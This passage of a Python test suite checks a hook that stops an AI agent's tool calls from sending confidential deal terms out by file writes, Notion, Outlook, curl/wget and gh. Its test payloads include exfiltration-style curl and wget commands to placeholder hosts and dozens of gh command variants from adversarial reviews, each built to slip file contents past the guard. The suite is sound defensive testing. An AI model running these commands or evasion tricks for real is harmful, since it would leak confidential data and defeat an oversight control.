#!/usr/bin/env python3
"""Blocking test suite for the ORA confidentiality egress guard (Phase 1.2).

Feeds crafted PreToolUse payloads to confidentiality-guard.py via stdin and asserts the
exit code. BLOCK == exit 2, ALLOW == exit 0.

CONFIDENTIALITY DESIGN (2026-06-11): this file is git-tracked to an off-machine remote,
so it must contain ZERO hardcoded deal identifiers. All blocked-term variants are derived
AT RUNTIME from the live (untracked) hooks/confidential-terms.json — the same file the
guard itself reads. A sanity gate refuses to run if the terms file is missing or carries
fewer than 3 always-terms, so an empty roster can never produce a vacuous pass.

Asserts every derived identifier variant (mixed-case + no-space) is blocked on every
egress surface (site write, .pptx/.docx/.pdf/.csv/.html artifacts, Notion write, Outlook
send, the live COM send path), that context-term sentences block when an identifier is
present, that the pure context-only branch (context_requires_any + context, no always-term
in the payload) is covered via a dedicated synthetic fixture whose trigger term is
deliberately absent from always — Phase C, closed 2026-07-17 — that INTERNAL use is
allowed, and that the guard fails CLOSED on an unparseable payload.

Run: python test-confidentiality-guard.py   (exit 0 = all pass; exit 1 = any fail)
"""
import os, sys, json, subprocess, tempfile, datetime, atexit, io, importlib.util, uuid

# This test spins up its own throwaway git repos in temp dirs. When invoked as part of
# the real pre-push hook chain, git sets GIT_DIR/GIT_WORK_TREE/GIT_INDEX_FILE (etc.) in
# this process's environment so IT can operate on the outer repo -- but those same vars
# leak into every subprocess git call below and silently redirect them at the outer repo
# instead of the temp one, breaking `git -C <tempdir> add/commit` with pathspec/128 errors.
_GIT_LEAK_VARS = ("GIT_DIR", "GIT_WORK_TREE", "GIT_INDEX_FILE", "GIT_COMMON_DIR",
                   "GIT_OBJECT_DIRECTORY", "GIT_ALTERNATE_OBJECT_DIRECTORIES", "GIT_PREFIX")
for _v in _GIT_LEAK_VARS:
    os.environ.pop(_v, None)


def _clean_env():
    """A fresh env dict with the leak vars stripped, built PER CALL rather than relying
    on the one-time os.environ mutation above -- so a git call stays hermetic even if
    something re-populates one of these vars in this process later."""
    env = dict(os.environ)
    for _v in _GIT_LEAK_VARS:
        env.pop(_v, None)
    return env


def _unique_branch_name(prefix="wt-branch"):
    """A hardcoded branch name is a real repo-level collision risk: `git worktree add -b
    <name>` registers the branch + worktree admin entry in the repo's SHARED common dir,
    not scoped to the throwaway tempdir. If GIT_DIR/GIT_COMMON_DIR ever leaks into this
    process, the branch lands in the shared real repo and PERSISTS there across runs --
    live-verified 2026-07-25: a leaked run left a real `wt-branch` ref sitting in
    ~/.claude's own .git for hours, colliding with later unrelated test runs. A unique
    suffix per call means even a leaked run can never collide with another."""
    return "%s-%s" % (prefix, uuid.uuid4().hex[:12])

HOOK_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))  # hooks/ (this test lives in hooks/tests/)
GUARD = os.path.join(HOOK_DIR, "confidentiality-guard.py")
TERMS_FILE = os.path.join(HOOK_DIR, "confidential-terms.json")


def _git_common_dir(start_dir):
    """Absolute path to the repo's shared .git dir (identical for every worktree
    of the same repo), or None on any failure. Uses _clean_env() so a leaked
    GIT_COMMON_DIR from the outer pre-push invocation cannot redirect it."""
    try:
        p = subprocess.run(["git", "-C", start_dir, "rev-parse", "--git-common-dir"],
                           capture_output=True, text=True, timeout=5, env=_clean_env())
    except Exception:
        return None
    if p.returncode != 0:
        return None
    out = p.stdout.strip()
    if not out:
        return None
    if not os.path.isabs(out):
        out = os.path.normpath(os.path.join(start_dir, out))
    return out


def _main_worktree_terms_file():
    """confidential-terms.json in the MAIN worktree, or None if unresolvable or
    already the path we just tried.

    WHY (2026-08-10): hooks/confidential-terms.json is gitignored, so
    `git worktree add` never checks it out -- this suite therefore printed
    "CANNOT RUN" and ENV-SKIPped on EVERY push from a linked worktree, which is
    now how most pushes happen. The production code under test,
    git-prepush-confidential-scan.py, solved exactly this on 2026-07-12 by
    falling back to the main worktree's copy; the TEST never inherited that
    fallback, so the guard's own suite quietly stopped running while the guard
    itself stayed fully covered. Deliberately mirrors that function so both
    resolve the roster identically -- change them together."""
    common_dir = _git_common_dir(HOOK_DIR)
    if common_dir is None:
        return None
    # Assumes <repo-root>/hooks/confidential-terms.json -- the same layout
    # TERMS_FILE itself relies on.
    candidate = os.path.join(os.path.dirname(common_dir), "hooks", "confidential-terms.json")
    if os.path.normcase(os.path.abspath(candidate)) == os.path.normcase(os.path.abspath(TERMS_FILE)):
        return None  # already the file we just tried
    return candidate


def _load_guard_module():
    """Import confidentiality-guard.py as a module so a unit test can call its
    internal stdin-decode helper directly, without a subprocess. Needed for the
    same reason eos-claude-md-guard.py's fix required this: the cp1252-vs-UTF-8
    stdin mis-decode this hook shares with it (both did bare sys.stdin.read())
    is an OS/parent-process codepage quirk that a subprocess spawned from this
    dev shell does not reliably reproduce, even though sys.stdin.encoding
    reports 'cp1252' in synthetic attempts too (see
    reference_windows_hook_stdin_cp1252_encoding_gap.md). Module-level code
    (site_markers import, TERMS_FILE resolution) runs on import but has no
    stdin dependency, so this is safe."""
    spec = importlib.util.spec_from_file_location("confidentiality_guard", GUARD)
    module = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(module)
    return module

NOTION = "mcp__c5f4869f-7d3a-4472-a66a-8e61315feb51__notion-create-pages"
NOTION_UPD = "mcp__c5f4869f-7d3a-4472-a66a-8e61315feb51__notion-update-page"
OUTLOOK = "mcp__composio-ora__OUTLOOK_SEND_EMAIL"
OUTLOOK_DRAFT = "mcp__composio-ora__OUTLOOK_CREATE_DRAFT"

SITE = "C:/Users/Owner/website-canonical/src/index.html"
PPTX = "C:/Users/Owner/OneDrive/outputs/2026-06-03_deck.pptx"
DOCX = "C:/Users/Owner/OneDrive/outputs/2026-06-03_memo.docx"
PDF = "C:/Users/Owner/OneDrive/outputs/2026-06-03_report.pdf"
CSV = "C:/Users/Owner/OneDrive/outputs/2026-06-03_rentroll.csv"
HTML = "C:/Users/Owner/oxford-command-center/dist/index.html"
INTERNAL = "C:/Users/Owner/deals/working/notes.md"


# --- derive test terms from the LIVE terms file (sanity-gated, never hardcoded) --------
# Synthetic fallback (2026-07-09): when zero deals are currently active (e.g. right after a
# declassification), the live roster alone can't exercise the matcher. confidentiality-guard.py
# reads its terms file directly (subprocess, not import), so injecting synthetic terms requires
# pointing THAT subprocess at a synthetic file -- not just changing what this test script
# generates. confidentiality-guard.py supports CONFIDENTIAL_TERMS_FILE_OVERRIDE for exactly this
# (mirrors shared-checkout-guard.py's SHARED_CHECKOUT_REPOS env override; unset in every real
# session, so production behavior is untouched). These are clearly-fake placeholder terms --
# never a real deal identifier.
ACTIVE_TERMS_FILE = TERMS_FILE  # what GUARD subprocess calls should read; may become a temp file below
SYNTHETIC_ALWAYS = ["Zephyr Corp Portfolio", "1234 Placeholder Ave", "Project Nightingale"]
SYNTHETIC_CONTEXT = ["synthetic contaminant plume"]


def _write_synthetic_terms_file():
    """Write a properly-shaped synthetic confidential-terms.json to a temp file and return its path."""
    fd, path = tempfile.mkstemp(prefix="synthetic-confidential-terms-", suffix=".json")
    data = {
        "_meta": {
            "purpose": "synthetic fixture for test-confidentiality-guard.py -- no real deal data",
            "roster_last_verified": datetime.date.today().isoformat(),
        },
        "synthetic_test_deal": {
            "active": True,
            "label": "Synthetic Test Deal (fixture, not real)",
            "always": SYNTHETIC_ALWAYS,
            "context": SYNTHETIC_CONTEXT,
            "context_requires_any": SYNTHETIC_ALWAYS,
            "note": "fixture only",
        },
    }
    with os.fdopen(fd, "w", encoding="utf-8") as f:
        json.dump(data, f)
    atexit.register(lambda: os.path.exists(path) and os.remove(path))
    return path


def load_live_terms():
    global ACTIVE_TERMS_FILE
    # Try this checkout's copy, then the MAIN worktree's -- the same two-step the
    # production scan uses. CANNOT RUN (-> ENV-SKIP) only if BOTH are unreadable,
    # which now means a genuinely broken roster rather than "you pushed from a
    # worktree", the case that was silently skipping this suite on most pushes.
    # Callables, not values: the fallback must stay LAZY so a readable local roster
    # never spawns a `git rev-parse` subprocess -- production resolves it only on
    # failure, and the mirror should match that too.
    data, errors = None, []
    for get_candidate in (lambda: TERMS_FILE, _main_worktree_terms_file):
        candidate = get_candidate()
        if candidate is None:
            continue
        try:
            with open(candidate, encoding="utf-8") as f:
                data = json.load(f)
        except Exception as e:
            # Record EVERY candidate's error, not just the first. In a worktree the
            # first is always an unremarkable "no such file" for the local path, and
            # keeping only that one would report a missing file while the ACTUAL
            # fault -- e.g. a corrupt main roster -- stayed invisible.
            errors.append("%s: %s" % (candidate, e))
            continue
        if data is None:
            # A file containing literal JSON `null` PARSES fine and yields None.
            # Breaking here would consume the candidate and never try the fallback,
            # even with a perfectly good main roster. Production's _read_json treats
            # a null parse as unreadable and falls through for exactly this reason --
            # this keeps the two resolvers honest about the "change them together"
            # contract above.
            errors.append("%s: parsed to null (no roster object)" % candidate)
            continue
        # Guard SUBPROCESSES must read the same file this function parsed, or the
        # suite would assert against one roster while the guard used another.
        ACTIVE_TERMS_FILE = candidate
        break
    if data is None:
        print("CANNOT RUN: confidential-terms.json unreadable — suite requires the live "
              "terms file, and the main-worktree fallback did not resolve either. "
              "Tried: %s" % ("; ".join(errors) if errors else "no candidate path resolved"))
        sys.exit(1)
    always, context = [], []
    for key, deal in data.items():
        if key.startswith("_") or not isinstance(deal, dict) or not deal.get("active", True):
            continue
        always.extend(t for t in deal.get("always", []) if isinstance(t, str) and t.strip())
        context.extend(t for t in deal.get("context", []) if isinstance(t, str) and t.strip())
    if len(always) < 3:
        print("No active deals in confidential-terms.json (fewer than 3 always-terms) — "
              "falling back to a SYNTHETIC terms file (via CONFIDENTIAL_TERMS_FILE_OVERRIDE) so "
              "the matcher engine itself stays regression-tested during this no-active-deal window.")
        ACTIVE_TERMS_FILE = _write_synthetic_terms_file()
        return SYNTHETIC_ALWAYS, SYNTHETIC_CONTEXT
    return always, context


def mixed_case(s):
    return "".join(c.upper() if i % 2 else c.lower() for i, c in enumerate(s))


def derive_variants(always):
    # Only variants the guard's lowercase-substring matcher is CONTRACTED to catch:
    # case noise around a term, plus squeezed forms that still contain another term
    # (e.g. a no-space form detectable via a shorter always-term inside it). Squeezed
    # multi-word forms with no surviving term are a documented guard gap — add such
    # forms to confidential-terms.json `always` (data fix), do not assert them here.
    lows = [t.lower() for t in always]
    out = []
    for t in always:
        for v in (t, t.upper(), t.title(), mixed_case(t),
                  t.replace(". ", ".") if ". " in t else None,
                  t.replace(" ", "") if " " in t else None):
            if v and v not in out and any(l in v.lower() for l in lows):
                out.append(v)
    return out


ALWAYS, CONTEXT = load_live_terms()
VARIANTS = derive_variants(ALWAYS)
A1, A2, A3 = ALWAYS[0], ALWAYS[1 % len(ALWAYS)], ALWAYS[2 % len(ALWAYS)]


def run(payload_obj, raw=None):
    raw = raw if raw is not None else json.dumps(payload_obj)
    env = dict(os.environ, CONFIDENTIAL_TERMS_FILE_OVERRIDE=ACTIVE_TERMS_FILE)
    p = subprocess.run([sys.executable, GUARD], input=raw.encode("utf-8"),
                       stdout=subprocess.PIPE, stderr=subprocess.PIPE, env=env)
    return p.returncode, p.stderr.decode("utf-8", "replace")


def write_payload(path, content):
    return {"tool_name": "Write", "tool_input": {"file_path": path, "content": content}}


def edit_payload(path, new):
    return {"tool_name": "Edit", "tool_input": {"file_path": path, "old_string": "x", "new_string": new}}


def notion_payload(tool, text):
    return {"tool_name": tool, "tool_input": {"pages": [{"properties": {"Name": text},
            "content": "Notes: " + text}]}}


def outlook_payload(tool, body):
    return {"tool_name": tool, "tool_input": {"subject": "Update", "body": body,
            "toRecipients": "ggoldberg@oxfordra.net"}}


def bash_payload(cmd):
    return {"tool_name": "Bash", "tool_input": {"command": cmd}}


results = []  # (ok, label)


def expect(label, code_expected, code, err=""):
    ok = (code == code_expected)
    results.append((ok, label))
    if not ok:
        print("  FAIL: %s  (expected exit %d, got %d) %s" % (label, code_expected, code, err.strip()[:160]))


# --- BLOCK: every derived variant on every egress surface ------------------------------
surfaces = [
    ("site", lambda v: write_payload(SITE, "Press release: " + v)),
    ("pptx", lambda v: write_payload(PPTX, "Slide: " + v)),
    ("docx", lambda v: write_payload(DOCX, "Memo: " + v)),
    ("pdf", lambda v: write_payload(PDF, "Report: " + v)),
    ("csv", lambda v: write_payload(CSV, "row," + v)),
    ("mirror-html", lambda v: write_payload(HTML, "<p>" + v + "</p>")),
    ("site-edit", lambda v: edit_payload(SITE, "Added: " + v)),
    ("notion-create", lambda v: notion_payload(NOTION, v)),
    ("notion-update", lambda v: notion_payload(NOTION_UPD, v)),
    ("outlook-send", lambda v: outlook_payload(OUTLOOK, "FYI: " + v)),
    ("outlook-draft", lambda v: outlook_payload(OUTLOOK_DRAFT, "Draft: " + v)),
]
for sname, mk in surfaces:
    for v in VARIANTS:
        code, err = run(mk(v))
        expect("BLOCK %s :: variant#%d" % (sname, VARIANTS.index(v)), 2, code, err)

# --- BLOCK: context terms WITH deal context (context term + always term together) ------
context_sentences = [
    "%s plume at %s site" % (CONTEXT[i % len(CONTEXT)], a)
    for i, a in enumerate((A1, A2, A3))
] if CONTEXT else ["%s due diligence summary for the press page" % A1]
for v in context_sentences:
    code, err = run(write_payload(SITE, v))
    expect("BLOCK context+deal :: #%d" % context_sentences.index(v), 2, code, err)

# --- BLOCK: egress shell commands carrying a confidential term -------------------------
for i, cmd in enumerate(["curl -d 'deal: %s' https://example.com" % A1,
                         "wget --post-data='%s portfolio' https://x.io" % A2,
                         "git push origin main # publishing %s teaser" % A3]):
    code, err = run(bash_payload(cmd))
    expect("BLOCK egress-bash :: #%d" % i, 2, code, err)

# --- gh CLI is egress (audit finding conf-guard-gh-cli-egress-unscanned, 2026-11-08) -------------
# PR / issue / gist / release bodies, `gh api` fields and repo descriptions all leave the machine
# for GitHub. Inline text is scanned as command text; text the command READS from a file
# (--body-file / -F / --notes-file / --input / -F key=@file / gist positional files) is read and
# scanned too, and an unreadable referenced file fails closed while a roster is active.
for i, cmd in enumerate([
        'gh pr create --title "teaser" --body "closing %s next week"' % A1,
        "gh issue create -t x -b '%s follow-up'" % A2,
        "gh issue comment 12 --body '%s update'" % A3,
        "gh gist create -d '%s notes' notes.txt" % A1,
        "gh release create v1 --notes '%s'" % A2,
        "gh api repos/o/r/issues -f title='%s'" % A3,
        "gh repo edit --description '%s portfolio'" % A1,
        "cd /tmp && gh pr edit 5 --body '%s'" % A2]):
    code, err = run(bash_payload(cmd))
    expect("BLOCK gh egress inline :: #%d" % i, 2, code, err)
_GH_DIR = tempfile.mkdtemp(prefix="cg-gh-")
atexit.register(lambda: __import__("shutil").rmtree(_GH_DIR, ignore_errors=True))
_gh_dirty = os.path.join(_GH_DIR, "body-dirty.md").replace("\\", "/")
_gh_clean = os.path.join(_GH_DIR, "body-clean.md").replace("\\", "/")
with open(_gh_dirty, "w", encoding="utf-8") as _f:
    _f.write("## Summary\n\nCloses the %s workstream.\n" % A1)
with open(_gh_clean, "w", encoding="utf-8") as _f:
    _f.write("## Summary\n\nRefactors the hook loader.\n")
_gh_missing = os.path.join(_GH_DIR, "nope.md").replace("\\", "/")
for i, cmd in enumerate([
        'gh pr create --title t --body-file "%s"' % _gh_dirty,
        'gh pr create --title t --body-file="%s"' % _gh_dirty,
        'gh issue create -t t -F "%s"' % _gh_dirty,
        'gh release create v1 --notes-file "%s"' % _gh_dirty,
        'gh api repos/o/r/issues -F body=@"%s"' % _gh_dirty,
        'gh api repos/o/r/issues --input "%s"' % _gh_dirty,
        'gh gist create "%s"' % _gh_dirty,
        'gh release upload v1 "%s"' % _gh_dirty]):
    code, err = run(bash_payload(cmd))
    expect("BLOCK gh egress via referenced file :: #%d" % i, 2, code, err)
# relative path resolved against the payload's cwd
code, err = run({"tool_name": "Bash", "cwd": _GH_DIR,
                 "tool_input": {"command": "gh pr create -t t --body-file body-dirty.md"}})
expect("BLOCK gh --body-file relative to payload cwd", 2, code, err)
code, err = run(bash_payload('gh pr create -t t --body-file "%s"' % _gh_missing))
expect("BLOCK gh --body-file unreadable (fail closed, roster active)", 2, code, err)
expect("ALLOW gh pr create with clean --body-file", 0,
       run(bash_payload('gh pr create --title "hook loader" --body-file "%s"' % _gh_clean))[0])
expect("ALLOW gh pr create with clean inline body", 0,
       run(bash_payload('gh pr create --title "hook loader" --body "Refactor only."'))[0])
expect("ALLOW gh pr list (read-only, no term)", 0, run(bash_payload("gh pr list --state open"))[0])
# heredoc bodies: an apostrophe in a body must not break tokenizing (no false block), and a term in
# a body is still caught as command text
_HD = "gh pr create --title t --body-file - <<'EOF'\n## Summary\nIt's a %s\nEOF\n"
expect("ALLOW gh heredoc body with apostrophe, clean", 0, run(bash_payload(_HD % "refactor"))[0])
expect("BLOCK gh heredoc body carrying a term", 2, run(bash_payload(_HD % A1))[0])
_SUB = 'gh pr create --title t --body "$(cat <<\'EOF\'\nIt\'s a refactor\nEOF\n)"'
expect("ALLOW gh $(cat <<EOF) body with apostrophe, clean", 0, run(bash_payload(_SUB))[0])
expect("BLOCK gh command that cannot be tokenized (fail closed, roster active)", 2,
       run(bash_payload("gh pr create --title 'unterminated --body-file x.md"))[0])
# Adversarial review of the gh fix (2026-11-08): every repro it found, pinned.
os.makedirs(os.path.join(_GH_DIR, "sub"), exist_ok=True)
for i, cmd in enumerate([
        'gh auth status\ngh gist create "%s"' % _gh_dirty,                    # C2a two lines
        'gh pr view 1\ngh release upload v1 "%s"' % _gh_dirty,                # C2a
        'gh pr create -t t -F="%s"' % _gh_dirty,                              # C2b -F=
        'gh api repos/o/r/issues -F=body=@"%s"' % _gh_dirty,                  # C2b api -F=
        'gh pr create -t t -dF "%s"' % _gh_dirty,                             # C2c bundled
        'gh pr create -t a#b --body-file "%s"' % _gh_dirty,                   # C2d '#'
        'cat <<< "hi"\ngh gist create "%s"' % _gh_dirty,                      # C8 here-string
        'echo "a <<END b"\ngh gist create "%s"' % _gh_dirty,                  # C8 quoted <<
        'gh release new v1 "%s"' % _gh_dirty,                                 # C3a alias
        'gh gist new "%s"' % _gh_dirty,                                       # C3a alias
        'gh release -R o/r create v1 "%s"' % _gh_dirty,                       # C3a -R first
        'gh gist edit abc -a "%s"' % _gh_dirty,                               # C3a gist edit
        'gh gist create "%s"/body-dirt*.md' % _GH_DIR,                        # C3b glob
        'F=x; gh gist create "$F"',                                           # C3b variable
        'gh pr create -t t --body "$(cat %s)"' % _gh_dirty,                   # C2e $(cat)
        'gh pr create -t t --body-file - < "%s"' % _gh_dirty,                 # C2e < redirect
        'gh api repos/o/r/issues --input - < "%s"' % _gh_dirty,               # C2e
        '"C:/Program Files/GitHub CLI/gh.exe" pr create -t t --body-file "%s"' % _gh_dirty,  # C1
        '"gh" pr create --body "%s"' % A1,                                    # C1 quoted
        'gh \\\n pr create --body "%s"' % A1,                                 # C1 continuation
        'gh repo create r --description "%s"' % A1,                           # scope
        'gh label create x -d "%s"' % A1,                                     # scope
        'gh secret set X --body "%s"' % A1]):                                 # scope
    code, err = run({"tool_name": "Bash", "cwd": os.path.join(_GH_DIR, "sub"),
                     "tool_input": {"command": cmd}})
    expect("BLOCK gh review repro :: #%d" % i, 2, code, err)
# C9: write-then-send is the standard PR-body workflow -- the body is command text, scanned.
_WTS = "cat > new-body.md <<'EOF'\n%s\nEOF\ngh pr create -t t --body-file new-body.md"
code, err = run({"tool_name": "Bash", "cwd": os.path.join(_GH_DIR, "sub"),
                 "tool_input": {"command": _WTS % "It's a clean refactor"}})
expect("ALLOW gh write-then-send body file (clean)", 0, code, err)
code, err = run({"tool_name": "Bash", "cwd": os.path.join(_GH_DIR, "sub"),
                 "tool_input": {"command": _WTS % ("closing " + A1)}})
expect("BLOCK gh write-then-send body file carrying a term", 2, code, err)
# Round-2 review repros (2026-11-08).
_SUBDIR = os.path.join(_GH_DIR, "sub")
for i, cmd in enumerate([
        'cat "%s" > fresh-body.md && gh pr create -t t --body-file fresh-body.md' % _gh_dirty,  # blocker
        'cat "%s" | tee fresh3.md >/dev/null; gh pr create -t t -F fresh3.md' % _gh_dirty,     # blocker
        "bash -c 'gh pr create -t t --body-file \"%s\"'" % _gh_dirty,                          # nested
        'echo "$(gh gist create %s)"' % _gh_dirty,                                             # nested
        'echo `gh gist create %s`' % _gh_dirty,                                                # nested
        'gh discussion create -t t -c General -b "%s"' % A1,                                   # scope
        'gh discussion create -t t -c General -F "%s"' % _gh_dirty,                            # scope
        'gh agent-task create -F "%s"' % _gh_dirty,                                            # scope
        'gh pr create -t t --body "$(cat clean.md %s)"' % _gh_dirty,                           # multi cat
        'gh pr create -t t --body "$(cat -- %s)"' % _gh_dirty,                                 # cat --
        '<"%s" gh pr create -t t --body-file -' % _gh_dirty]):                                 # leading <
    code, err = run({"tool_name": "Bash", "cwd": _SUBDIR, "tool_input": {"command": cmd}})
    expect("BLOCK gh round-2 repro :: #%d" % i, 2, code, err)
for i, cmd in enumerate([
        "# don't forget\ngh pr list",
        "# Create the PR (it's ready)\ngh pr create -t t --body \"ok\"",
        "# later: gh pr create --body-file notyet.md\ngh pr list",
        "echo 'a <<END b'\ngh pr list",
        "printf 'clean body\\n' > p.md && gh pr create -t t --body-file p.md"]):
    code, err = run({"tool_name": "Bash", "cwd": _SUBDIR, "tool_input": {"command": cmd}})
    expect("ALLOW gh round-2 clean use :: #%d" % i, 0, code, err)
# Round-3 review repros (2026-11-08): constructs are refused structurally while a roster is active.
for i, cmd in enumerate([
        "cat > w3.md <<'EOF'\nhdr\nEOF\ncat \"%s\" >> w3.md\ngh pr create -t t -F w3.md" % _gh_dirty,
        'echo hi > w4.md; cp "%s" w4.md; gh pr create -t t -F w4.md' % _gh_dirty,
        "gh pr create -t t --body-file - <<EOF\n$(cat %s)\nEOF" % _gh_dirty,
        "gh pr create -t t --body-file - <<EOF\n`cat %s`\nEOF" % _gh_dirty,
        'gh pr create -t t --body "`cat %s`"' % _gh_dirty,
        'echo `cat %s` > w2.md && gh pr create -t t -F w2.md' % _gh_dirty,
        'gh pr create -t t --body-file <(cat "%s")' % _gh_dirty,
        'gh pr create -t t --body-file - < <(cat "%s")' % _gh_dirty,
        'gh pr create -t t 2>&1 -F "%s"' % _gh_dirty,
        'gh pr create -t t &>/dev/null -F "%s"' % _gh_dirty,
        "gh 'gist' create \"%s\"" % _gh_dirty,
        "gh pr view 1 | xargs gh gist create",
        "eval 'gh gist create \"%s\"'" % _gh_dirty]):
    code, err = run({"tool_name": "Bash", "cwd": _SUBDIR, "tool_input": {"command": cmd}})
    expect("BLOCK gh round-3 repro :: #%d" % i, 2, code, err)
for i, cmd in enumerate([
        'grep -n "gh pr create" hooks/*.py',
        'git commit -m "docs: mention gh pr create" && git push',
        "gh pr create -t t --body \"$(cat <<'EOF'\n## Summary\nUses `code` spans and it's fine\nEOF\n)\"",
        "gh pr create -t t --body-file - <<'EOF'\nquoted body with `backticks` and $(literal)\nEOF"]):
    code, err = run({"tool_name": "Bash", "cwd": _SUBDIR, "tool_input": {"command": cmd}})
    expect("ALLOW gh round-3 clean use :: #%d" % i, 0, code, err)
# Round-4 review repros: wrapper before the shell runner leaks; literal backticks are text.
for i, cmd in enumerate([
        "timeout 60 bash -c 'gh gist create \"%s\"'" % _gh_dirty,
        "env bash -c 'gh gist create \"%s\"'" % _gh_dirty,
        "nohup sh -c 'gh gist create \"%s\"'" % _gh_dirty,
        'gh pr create -t t --body "x $(cat %s)"' % _gh_dirty,
        "gh pr create -t t --body-file - <<EOF\nIt's $(cat %s)\nEOF" % _gh_dirty,
        "gh pr create -t t --body-file - <<EOF\nIt's `cat %s`\nEOF" % _gh_dirty,
        "cat > b.md <<EOF\nIt's ok\nEOF\ngh pr comment 1 --body \"$(cat %s)\"" % _gh_dirty,
        "gh pr create -t t --body-file - <<EOF\nx \\\\$(cat %s)\nEOF" % _gh_dirty]):
    code, err = run({"tool_name": "Bash", "cwd": _SUBDIR, "tool_input": {"command": cmd}})
    expect("BLOCK gh round-4 repro :: #%d" % i, 2, code, err)
expect("ALLOW runner name used as an argument after gh", 0,
       run({"tool_name": "Bash", "cwd": _SUBDIR, "tool_input": {
           "command": 'gh pr create -t cmd --body "uses gh pr view"'}})[0])
for i, cmd in enumerate([
        "gh pr comment 5 --body 'Fixed in `abc123`'",
        'gh pr create -t t --body "Run \\`npm test\\`"',
        "grep -n '`' f; gh pr list"]):
    code, err = run({"tool_name": "Bash", "cwd": _SUBDIR, "tool_input": {"command": cmd}})
    expect("ALLOW gh round-4 clean use :: #%d" % i, 0, code, err)
# Git Bash /tmp is %TEMP%: a body written there in one call and sent in the next must resolve.
_tmp_body = os.path.join(tempfile.gettempdir(), "cg-gh-tmp-%s.md" % uuid.uuid4().hex[:8])
with open(_tmp_body, "w", encoding="utf-8") as _f:
    _f.write("clean refactor body\n")
atexit.register(lambda: os.path.exists(_tmp_body) and os.remove(_tmp_body))
if os.name == "nt":
    expect("ALLOW gh --body-file /tmp/... resolved to %TEMP% (Git Bash)", 0,
           run(bash_payload("gh pr create -t t --body-file /tmp/%s" % os.path.basename(_tmp_body)))[0])
# C7 (pre-existing): a non-string Bash command must block, not crash to a non-blocking exit 1.
expect("BLOCK Bash with non-string command", 2,
       run({"tool_name": "Bash", "tool_input": {"command": ["gh", "pr"]}})[0])
# With NO active roster nothing is read and nothing blocks, even an unreadable reference.
_GH_EMPTY = os.path.join(_GH_DIR, "empty-roster.json")
with open(_GH_EMPTY, "w", encoding="utf-8") as _f:
    json.dump({"_meta": {"roster_last_verified": datetime.date.today().isoformat()}}, _f)
_p = subprocess.run([sys.executable, GUARD], input=json.dumps(bash_payload(
    'gh pr create -t t --body-file "%s"' % _gh_missing)).encode("utf-8"),
    stdout=subprocess.PIPE, stderr=subprocess.PIPE,
    env=dict(os.environ, CONFIDENTIAL_TERMS_FILE_OVERRIDE=_GH_EMPTY))
expect("ALLOW gh unreadable --body-file when no deal is active", 0, _p.returncode,
       _p.stderr.decode("utf-8", "replace"))
expect("ALLOW gh api with plain -F field (not a file ref)", 0,
       run(bash_payload("gh api repos/o/r/issues -F draft=true -f title=cleanup"))[0])

# --- COM send path (send-via-outlook.ps1) is egress — review finding 2026-06-11 --------
COM = ('powershell -NoProfile -File '
       '"C:\\Users\\Owner\\.claude\\scheduled-tasks\\_shared\\send-via-outlook.ps1" '
       '-To ggoldberg@oxfordra.net -Subject Update -Body ')
code, err = run(bash_payload(COM + '"%s status update"' % A1))
expect("BLOCK com-send w/ always-term", 2, code, err)
expect("ALLOW clean com-send", 0, run(bash_payload(COM + '"Quarterly portfolio summary attached"'))[0])

# --- BLOCK: fail-closed on unparseable payload -----------------------------------------
code, err = run(None, raw="{ this is not json ")
expect("BLOCK fail-closed (bad JSON)", 2, code, err)

# --- ALLOW: internal use of the deal (not egress) --------------------------------------
expect("ALLOW internal write w/ always-term", 0, run(write_payload(INTERNAL, "%s due diligence notes" % A1))[0])
expect("ALLOW internal bash w/ deal path", 0, run(bash_payload('cd "/c/deals/%s" && ls' % A1))[0])
expect("ALLOW clean site write", 0, run(write_payload(SITE, "Columbus industrial market update Q2 2026"))[0])
expect("ALLOW clean notion write", 0, run(notion_payload(NOTION, "Banwick Road lease renewal"))[0])
expect("ALLOW clean outlook send", 0, run(outlook_payload(OUTLOOK, "Quarterly portfolio summary attached"))[0])
expect("ALLOW clean git push", 0, run(bash_payload("git push origin main"))[0])
# context term WITHOUT deal context must not block generic market commentary
if CONTEXT:
    expect("ALLOW context-term generic (no deal)", 0,
           run(write_payload(SITE, "%s is a common industrial contaminant nationwide" % CONTEXT[0]))[0])

# --- Phase C: pure context-only branch (find_hit()'s context_requires_any + context loop) --
# 2026-07-17: closes the gap this file's own docstring flagged since 2026-06-11. In BOTH the
# synthetic fixture above (context_requires_any == SYNTHETIC_ALWAYS) and every real deal seen
# so far, every context_requires_any trigger is ALSO an always-term -- so any text that could
# satisfy context_requires_any necessarily contains an always-term too, and find_hit()'s
# always-loop (checked first) short-circuits before the context-loop ever runs. The context-only
# branch has therefore never been exercised by this suite. Fix: a dedicated fixture whose
# context_requires_any trigger is deliberately ABSENT from always, so a payload can satisfy
# context_requires_any without also tripping the always-loop -- the only shape that reaches the
# context loop in isolation. Uses its own run_ctx() (not the module-global run()/ACTIVE_TERMS_FILE)
# so this fixture never leaks into the rest of the suite's subprocess calls.
CTX_ALWAYS = "Marlowe Holdings Trust"           # this fixture's always-term (positive control only)
CTX_CONTEXT = "synthetic contaminant plume"     # context term
CTX_TRIGGER = "projectcodeq7"                   # context_requires_any trigger -- deliberately NOT in always


def _write_context_only_fixture():
    """Synthetic terms file whose context_requires_any trigger is absent from always, so a
    payload containing CTX_CONTEXT + CTX_TRIGGER (no always-term) reaches the context loop
    without the always loop pre-empting it. Fake placeholders only -- never a real deal."""
    fd, path = tempfile.mkstemp(prefix="synthetic-context-only-terms-", suffix=".json")
    data = {
        "_meta": {
            "purpose": "synthetic fixture for the context-only branch (Phase C) -- no real deal data",
            "roster_last_verified": datetime.date.today().isoformat(),
        },
        "context_only_fixture_deal": {
            "active": True,
            "label": "Context-Only Fixture Deal (fixture, not real)",
            "always": [CTX_ALWAYS],
            "context": [CTX_CONTEXT],
            "context_requires_any": [CTX_TRIGGER],
        },
    }
    with os.fdopen(fd, "w", encoding="utf-8") as f:
        json.dump(data, f)
    atexit.register(lambda: os.path.exists(path) and os.remove(path))
    return path


_CTX_FIXTURE_PATH = _write_context_only_fixture()


def run_ctx(payload_obj, tool_name_override=None):
    """Like run(), but always points the guard subprocess at the context-only fixture,
    independent of ACTIVE_TERMS_FILE -- isolates this section from the rest of the suite."""
    raw = json.dumps(payload_obj)
    env = dict(os.environ, CONFIDENTIAL_TERMS_FILE_OVERRIDE=_CTX_FIXTURE_PATH)
    p = subprocess.run([sys.executable, GUARD], input=raw.encode("utf-8"),
                       stdout=subprocess.PIPE, stderr=subprocess.PIPE, env=env)
